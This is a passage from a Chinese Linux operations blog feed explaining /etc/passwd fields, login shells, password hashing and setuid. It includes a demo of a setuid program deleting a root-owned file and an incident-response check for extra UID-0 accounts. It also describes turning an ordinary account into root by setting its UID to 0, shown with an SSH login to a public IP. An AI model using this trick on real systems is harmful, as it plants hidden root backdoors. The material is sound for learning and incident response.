class="hljs-number">64240</span>, options [mss <span class="hljs-number">1460</span>,sackOK,TS val <span class="hljs-number">2673454748</span> ecr <span class="hljs-number">0</span>,nop,wscale <span class="hljs-number">7</span>], <span class="hljs-built_in">length</span> <span class="hljs-number">0</span><br><span class="hljs-number">23</span>:<span class="hljs-number">40</span>:<span class="hljs-number">20.221641</span> IP (tos <span class="hljs-number">0x0</span>, ttl <span class="hljs-number">60</span>, <span class="hljs-built_in">id</span> <span class="hljs-number">58830</span>, <span class="hljs-built_in">offset</span> <span class="hljs-number">0</span>, flags [DF], proto TCP (<span class="hljs-number">6</span>), <span class="hljs-built_in">length</span> <span class="hljs-number">52</span>)<br>    <span class="hljs-number">10.210</span><span class="hljs-number">.128</span><span class="hljs-number">.37</span><span class="hljs-number">.53668</span> &gt; <span class="hljs-number">10.13</span><span class="hljs-number">.8</span><span class="hljs-number">.56</span>.search-agent: Flags [.], cksum <span class="hljs-number">0x8ef6</span> (correct), ack <span class="hljs-number">3988933476</span>, win <span class="hljs-number">502</span>, options [nop,nop,TS val <span class="hljs-number">2673454749</span> ecr <span class="hljs-number">1031614118</span>], <span class="hljs-built_in">length</span> <span class="hljs-number">0</span><br>^C<br><span class="hljs-number">2</span> packets captured<br><span class="hljs-number">3</span> packets received <span class="hljs-keyword">by</span> filter<br><span class="hljs-number">0</span> packets dropped <span class="hljs-keyword">by</span> kernel<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>passwd</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/passwd/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/passwd/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h1><p>存储账户的文件</p><p>只能是管理员修改，其他用户只有可读权限</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ll  <span class="hljs-string">/etc/passwd</span><br>-rw-r<span class="hljs-params">--r--</span> 1 root root 1414 Aug 22 09<span class="hljs-function">:16</span> <span class="hljs-string">/etc/passwd</span><br></code></pre></td></tr></table></figure><p>内容示例：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs ruby">(base) [root<span class="hljs-variable">@110</span> skel]<span class="hljs-comment"># cat /etc/passwd</span><br><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">adm:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span><span class="hljs-symbol">:adm</span><span class="hljs-symbol">:/var/adm</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin/sync</span><br><span class="hljs-symbol">shutdown:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:shutdown</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/sbin/shutdown</span><br><span class="hljs-symbol">halt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:halt</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/sbin/halt</span><br><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/spool/mail</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">operator:</span><span class="hljs-symbol">x:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:operator</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">12</span><span class="hljs-symbol">:</span><span class="hljs-number">100</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">ftp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">14</span><span class="hljs-symbol">:</span><span class="hljs-number">50</span><span class="hljs-symbol">:FTP</span> <span class="hljs-title class_">User</span><span class="hljs-symbol">:/var/ftp</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">99</span><span class="hljs-symbol">:</span><span class="hljs-number">99</span><span class="hljs-symbol">:Nobody</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br>systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">192</span><span class="hljs-symbol">:</span><span class="hljs-number">192</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">dbus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">81</span><span class="hljs-symbol">:</span><span class="hljs-number">81</span><span class="hljs-symbol">:System</span> message <span class="hljs-symbol">bus:</span>/<span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">polkitd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">999</span><span class="hljs-symbol">:</span><span class="hljs-number">997</span><span class="hljs-symbol">:User</span> <span class="hljs-keyword">for</span> <span class="hljs-symbol">polkitd:</span>/<span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">postfix:</span><span class="hljs-symbol">x:</span><span class="hljs-number">89</span><span class="hljs-symbol">:</span><span class="hljs-number">89</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/postfix</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">chrony:</span><span class="hljs-symbol">x:</span><span class="hljs-number">998</span><span class="hljs-symbol">:</span><span class="hljs-number">996</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/chrony</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">74</span><span class="hljs-symbol">:</span><span class="hljs-number">74</span><span class="hljs-symbol">:Privilege-separated</span> <span class="hljs-variable constant_">SSH</span><span class="hljs-symbol">:/var/empty/sshd</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">ntp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/etc/ntp</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">tcpdump:</span><span class="hljs-symbol">x:</span><span class="hljs-number">72</span><span class="hljs-symbol">:</span><span class="hljs-number">72</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">nscd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">28</span><span class="hljs-symbol">:</span><span class="hljs-number">28</span><span class="hljs-symbol">:NSCD</span> <span class="hljs-title class_">Daemon</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">test:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/test</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">redis:</span><span class="hljs-symbol">x:</span><span class="hljs-number">997</span><span class="hljs-symbol">:</span><span class="hljs-number">993</span><span class="hljs-symbol">:Redis</span> <span class="hljs-title class_">Database</span> <span class="hljs-title class_">Server</span><span class="hljs-symbol">:/var/lib/redis</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">dovecot:</span><span class="hljs-symbol">x:</span><span class="hljs-number">97</span><span class="hljs-symbol">:</span><span class="hljs-number">97</span><span class="hljs-symbol">:Dovecot</span> <span class="hljs-variable constant_">IMAP</span> <span class="hljs-symbol">server:</span>/usr/libexec/<span class="hljs-symbol">dovecot:</span>/sbin/nologin<br><span class="hljs-symbol">dovenull:</span><span class="hljs-symbol">x:</span><span class="hljs-number">996</span><span class="hljs-symbol">:</span><span class="hljs-number">992</span><span class="hljs-symbol">:Dovecot<span class="hljs-string">&#x27;s unauthorized user:/usr/libexec/dovecot:/sbin/nologin</span></span><br><span class="hljs-string"><span class="hljs-symbol">saslauth:x:995:76:Saslauthd user:/run/saslauthd:/sbin/nologin</span></span><br><span class="hljs-string"><span class="hljs-symbol">apache:x:1001:1001::/home/apache:/bin/bash</span></span><br></code></pre></td></tr></table></figure><p>第一列：账户名</p><p>第二列：原本用于保存密码，现在密码都保存在&#x2F;etc&#x2F;shadow文件，所有都用x替代</p><p>第三列：UID，用户ID，默认管理员(root)为0，也就是0表示为特权账户；1-1000默认为系统用户；也就是正常useradd添加的用户，UID都是大于1000的。</p><p>第四列：GID，用户组ID，和UID相似</p><p>第五列：用户说明</p><p>第六列：用户家目录</p><p>第七列：用户使用的shell</p><p>权限提升：</p><p>指定用户的uid修改为0，即可成为特权用户root，也就是说会有root的权限，也有root的限制，例如：如果有设置root不可登录，提升权限的用户也不可登录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\WINDOWS\system32&gt;ssh test123@<span class="hljs-number">114.132.246.141</span><br><span class="hljs-attribute">test123</span>@<span class="hljs-number">114.132.246.141</span>&#x27;s password:<br><span class="hljs-attribute">Welcome</span> to Ubuntu <span class="hljs-number">20</span>.<span class="hljs-number">04</span> LTS (GNU/Linux <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">77</span>-generic x86_64)<br><br><span class="hljs-comment"># id</span><br><span class="hljs-attribute">uid</span>=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br></code></pre></td></tr></table></figure><p>默认添加的普通用户bash为&#x2F;bin&#x2F;sh，如果将bash替换为&#x2F;bin&#x2F;bash，使用被提升账户登录后就直接是root</p><p>应急响应需要注意点：</p><p>检查是否存在非root的特权账户</p><p>awk -F: ‘$3&#x3D;&#x3D;0{print $1}’ &#x2F;etc&#x2F;passwd</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:/home/ubuntu# awk -F: &#x27;$<span class="hljs-number">3</span>==<span class="hljs-number">0</span>&#123;print $<span class="hljs-number">1</span>&#125;&#x27; /etc/passwd<br><span class="hljs-attribute">root</span><br><span class="hljs-attribute">test123</span><br></code></pre></td></tr></table></figure><h1 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h1><p>用户修改用户密码</p><p>默认加密方式为sha512，也就是shadow中以$6开头</p><p>test1:$6$Ld0DTWyFKov1udF7$t1zIuW.XOkBs&#x2F;SfFk1RGzLB9WMHPGgI&#x2F;bN7Q3aGsbliklViiClVLmRbaJ&#x2F;ZPzFuqp9VyoMCHnMJBJ.gLazOvf0:18953:0:99999:7:::</p><p>root@VM-8-5-ubuntu:&#x2F;home&#x2F;ubuntu# ls -lat &#x2F;usr&#x2F;bin&#x2F;passwd<br>-rwsr-xr-x 1 root root 68208 Apr 16  2020 &#x2F;usr&#x2F;bin&#x2F;passwd</p><h1 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h1><p>&#x2F;etc&#x2F;passwd第7列为用户所使用的shell，可以表示用户的部分权限</p><p>常见值为 &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;sh &#x2F;usr&#x2F;sbin&#x2F;nologin &#x2F;bin&#x2F;false</p><p>区别</p><p>&#x2F;bin&#x2F;bash 可以登录系统</p><p>&#x2F;bin&#x2F;sh 可以登录系统，软链接（centos下 &#x2F;bin&#x2F;sh -&gt; bash; ubuntu 下&#x2F;bin&#x2F;sh -&gt; dash）</p><p>&#x2F;usr&#x2F;sbin&#x2F;nologin 只不允许登录系统</p><p>&#x2F;bin&#x2F;false 最严格的禁止login选项，一切服务均不可用</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">(base) root<span class="hljs-variable">@VM</span>-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-<span class="hljs-symbol">ubuntu:</span>/home/ubuntu<span class="hljs-comment"># cat /etc/passwd | grep test | more</span><br><span class="hljs-symbol">test:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/test</span><span class="hljs-symbol">:/bin/sh</span><br><span class="hljs-symbol">test1:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1004</span><span class="hljs-symbol">:</span><span class="hljs-number">1004</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/test1</span><span class="hljs-symbol">:/usr/sbin/login</span><br><span class="hljs-symbol">test2:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1005</span><span class="hljs-symbol">:</span><span class="hljs-number">1005</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/test2</span><span class="hljs-symbol">:/bin/false</span><br></code></pre></td></tr></table></figure><h1 id="setuid"><a href="#setuid" class="headerlink" title="setuid"></a>setuid</h1><p>&#x2F;etc&#x2F;shadow权限为000，也就是说普通用户没有任何权限，那为什么普通用户可以修改自己的密码？</p><p>查询资料得知，是因为passwd命令存在s标记，且在文件系统中&#x2F;usr&#x2F;bin&#x2F;passwd文件归属于root:root,所以在passwd运行时将以root权限。</p><p>s标记来源setuid。</p><p>setuid</p><p>setuid设置的程序，任何用户执行时，均以该文件在文件系统中的归属者权限运行。</p><p>测试案例：</p><p>root环境下编写c文件，nc0.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pwd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span>  <span class="hljs-title class_">passwd</span> *pwd;<br>    pwd = <span class="hljs-built_in">getpwuid</span>(<span class="hljs-built_in">getuid</span>());<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s uid is: %d\n&quot;</span>,pwd-&gt;pw_name,<span class="hljs-built_in">geteuid</span>());<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">30</span>);<br>    <span class="hljs-built_in">remove</span>(<span class="hljs-string">&quot;nc0del.txt&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>编译生成二进制文件nc0</p><p>gcc nc0.c -o nc0</p><p>创建root权限文件nc0del.txt</p><p>touch nc0del.txt</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -l</span><br>total 24<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br></code></pre></td></tr></table></figure><p>没有设置setuid执行nc0</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ id<br>uid=1002(nc0) gid=1002(nc0) groups=1002(nc0)<br>$ pwd<br>/opt/nc0<br>$ ls -l<br>total 24<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br>$ ./nc0<br>nc0 uid is: 1002<br>$ ls -l<br>total 24<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br></code></pre></td></tr></table></figure><p>可以看到执行nc0，并没有删除root权限的nc0test.txt</p><p>设置setuid执行nc0</p><p>chmod +s nc0</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -l</span><br>total 24<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br>root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># chmod +s nc0</span><br>root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -l</span><br>total 24<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ ls -l<br>total 24<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br>$ ./nc0<br>nc0 uid is: 0<br>$ ls -l<br>total 24<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br><br><br>root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ps -ef | grep nc0</span><br>root       <span class="hljs-number"> 2532 </span>   <span class="hljs-number"> 840 </span><span class="hljs-number"> 0 </span>22:45 ?        00:00:00 sshd: nc0 [priv]<br>nc0        <span class="hljs-number"> 2553 </span>     <span class="hljs-number"> 1 </span><span class="hljs-number"> 0 </span>22:45 ?        00:00:00 /lib/systemd/systemd --user<br>nc0        <span class="hljs-number"> 2562 </span>  <span class="hljs-number"> 2553 </span><span class="hljs-number"> 0 </span>22:45 ?        00:00:00 (sd-pam)<br>nc0        <span class="hljs-number"> 2633 </span>  <span class="hljs-number"> 2532 </span><span class="hljs-number"> 0 </span>22:45 ?        00:00:00 sshd: nc0@pts/1<br>nc0        <span class="hljs-number"> 2639 </span>  <span class="hljs-number"> 2633 </span><span class="hljs-number"> 0 </span>22:45 pts/1    00:00:00 -sh<br>root       <span class="hljs-number"> 4738 </span>  <span class="hljs-number"> 2639 </span><span class="hljs-number"> 0 </span>22:55 pts/1    00:00:00 ./nc0<br></code></pre></td></tr></table></figure><p>可以看到执行nc0命令的时候是以root的权限运行的，成功删除root权限文件，同时可以看到执行的用户是root用户。</p><p>常见setuid的命令</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -l /usr/bin/ | grep &quot;rws&quot;</span><br>-rwsr-sr-x<span class="hljs-number"> 1 </span>daemon daemon     <span class="hljs-number"> 55560 </span>Nov<span class="hljs-number"> 13 </span><span class="hljs-number"> 2018 </span>at<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 85064 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>chfn<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 53040 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>chsh<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 39144 </span>Mar <span class="hljs-number"> 7 </span><span class="hljs-number"> 2020 </span>fusermount<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 88464 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>gpasswd<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 55528 </span>Apr <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>mount<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 44784 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>newgrp<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 68208 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>passwd<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 31032 </span>May<span class="hljs-number"> 26 </span>19:50 pkexec<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 67816 </span>Apr <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>su<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root      <span class="hljs-number"> 166056 </span>Jan<span class="hljs-number"> 19 </span><span class="hljs-number"> 2021 </span>sudo<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 39144 </span>Apr <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>umount<br></code></pre></td></tr></table></figure><p>setuid注意事项</p><p>1、setuid基于安全考虑，只在二进制文件有效</p><p>测试在sh脚本的有效性，可以添加属性，但是无法生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@VM-8-5-ubuntu:/opt/nc0# <span class="hljs-built_in">cat</span> nc0.sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*当前登陆的用户名:<span class="hljs-variable">$USER</span>   UID:<span class="hljs-variable">$UID</span>&quot;</span><br><span class="hljs-built_in">rm</span> -rf nc0del.txt<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -lat *</span><br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 23 </span>17:06 nc0del.txt<br>-rwSr--r--<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 68 </span>Nov<span class="hljs-number"> 23 </span>17:06 nc0.sh<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 